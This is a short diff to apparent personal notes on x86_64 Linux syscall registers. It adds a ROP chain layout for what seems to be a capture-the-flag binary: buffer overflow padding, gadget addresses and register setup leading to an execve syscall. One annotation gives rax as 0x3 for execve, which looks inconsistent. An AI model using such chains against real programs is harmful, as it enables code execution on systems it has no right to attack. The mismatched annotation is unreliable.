@@ -3,3 +3,19 @@ LINUX KERNEL SYSCALL TABLES: hhttps://www.chromium.org/chromium-os/developer-lib
 arch 	syscall NR 	    return 	arg0 	arg1 	arg2 	arg3 	arg4 	arg5
 x86_64 	rax 	        rax 	rdi 	rsi 	rdx 	r10 	r8 	    r9
 
+[ buffer ]             "A" * 32
+[ rbp ]                "A" * 8
+[ pop rdi ; ret ]      0x0000000000401032
+[ 0x12 ]               0x0000000000000012
+[ xor eax, edi ; ret ] 0x0000000000401039   =>    rax = 0x3
+[ pop rdi ; ret ]      0x0000000000401032
+[ file ]               0x0000000000404000   =>    rdi = *file
+[ pop rdx ; ret ]      0x0000000000401036
+[ 0x00 ]               0x0000000000000000   =>    rdx = 0
+[ pop rsi ; ret ]      0x0000000000401034
+[ 0x00 ]               0x0000000000000000   =>    rsi = 0
+[ syscall ]            0x000000000040101a   =>    syscall (execve)
+[ ret ]                0x000000000040101c   =>    ret
+
+
+syscall: execve
